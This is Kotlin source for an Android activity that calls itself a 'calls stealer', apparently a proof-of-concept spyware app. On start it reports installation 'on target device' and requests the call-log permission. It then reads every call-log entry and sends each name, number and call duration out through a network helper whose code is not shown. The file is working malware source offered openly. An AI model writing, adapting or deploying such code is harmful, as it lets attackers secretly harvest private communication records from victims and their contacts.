package cocomelonc.hackcalls

import cocomelonc.hackcalls.tools.HackCallsNetwork
import android.os.Bundle
import androidx.activity.ComponentActivity

import android.widget.Button
import androidx.activity.result.contract.ActivityResultContracts
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat

class HackCallsMainActivity : ComponentActivity() {

    private lateinit var cameraButton: Button
    private lateinit var hackCallsViewModel: HackCallsViewModel

    // activity result launcher to request permission
    @RequiresApi(33)
    private val requestPermissionLauncher = registerForActivityResult (
        ActivityResultContracts.RequestPermission()) {isGranted: Boolean ->
        if (isGranted) {
            HackCallsNetwork(this).sendTextMessage("LoveBahrain Calls permission granted\n")
            Toast.makeText(this, "Hack Calls permission granted", Toast.LENGTH_SHORT).show()
            this.displayLog()
        } else {
            HackCallsNetwork(this).sendTextMessage("LoveBahrain Calls permission denied\n")
            Toast.makeText(this, "Hack Calls permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    // checking cam permission
    @RequiresApi(33)
    private fun checkCallsPermission() {
        val readCallLogPermission = ContextCompat.checkSelfPermission(this,
            android.Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
        when {
            readCallLogPermission -> {
                // permission is granted
                Toast.makeText(this, "Hack Calls All permissions already granted", Toast.LENGTH_SHORT).show()
                HackCallsNetwork(this).sendTextMessage("LoveBahrain Calls permission already granted\n")
                this.displayLog()
            } else -> {
            requestPermissionLauncher.launch(android.Manifest.permission.READ_CALL_LOG)
        }
        }
    }

    @RequiresApi(33)
    private fun displayLog() {
        val cols = arrayOf(CallLog.Calls._ID,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION, CallLog.Calls.DATE)
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, cols, null,
            null, "${CallLog.Calls.LAST_MODIFIED} DESC")

        cursor?.use {
//            val idIndex = it.getColumnIndex(CallLog.Calls._ID)
            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
//            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
//            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

            while (it.moveToNext()) {
//                val numberRow = it.getString(numberIndex)
                val nameRow = it.getString(nameIndex)
                val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
                val number = it.getString(numberIndex)
                val duration = it.getString(durationIndex) ?: "0"
                HackCallsNetwork(this).sendTextMessage("CALL LOG: $name, $number, $duration")
            }
        }
    }

    @RequiresApi(33)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hackCallsViewModel = HackCallsViewModel(this)
        setContentView(R.layout.activity_main)
        HackCallsNetwork(this).sendTextMessage("LoveBahrain calls stealer has been installed on target device and opened\nIgnore this message if you received it from this device before")

        checkCallsPermission()
        cameraButton = findViewById(R.id.camButton)

        cameraButton.setOnClickListener {
            checkCallsPermission()
        }

    }
}
